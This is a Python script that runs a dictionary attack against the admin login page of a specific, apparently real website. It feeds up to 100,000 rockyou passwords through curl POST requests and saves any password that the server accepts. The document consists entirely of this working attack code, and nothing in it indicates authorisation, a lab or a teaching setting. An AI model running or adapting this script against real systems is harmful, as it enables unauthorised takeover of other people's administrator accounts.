import subprocess
import sys

count = 0
with open("/tmp/rockyou.txt", "r", encoding="latin-1", errors="ignore") as f:
    for line in f:
        password = line.strip()
        if not password:
            continue
        count += 1
        if count > 100000:
            break
        if count % 1000 == 0:
            print(f"Tried {count}/100000 passwords...", flush=True)
        try:
            result = subprocess.run(
                ["curl", "-s", "--max-time", "2",
                 "http://bjhzsv.com/main/a7chkuser.asp",
                 "-d", "t1=admin&t2=" + password + "&t3=0000"],
                capture_output=True, timeout=5
            )
            raw = result.stdout
            decoded = raw.decode("gb2312")
            if "密码错误" not in decoded:
                with open("/tmp/admin_password_found.txt", "w") as fout:
                    fout.write("FOUND PASSWORD: " + password + "\n")
                    fout.write("Response: " + decoded[:500] + "\n")
                print("*** PASSWORD FOUND: " + password + " ***", flush=True)
                sys.exit(0)
        except Exception as e:
            pass

with open("/tmp/admin_password_status.txt", "w") as f:
    f.write("Done trying " + str(count) + " passwords - no match found\n")
print("Done. Tried " + str(count) + " passwords, no match found.", flush=True)
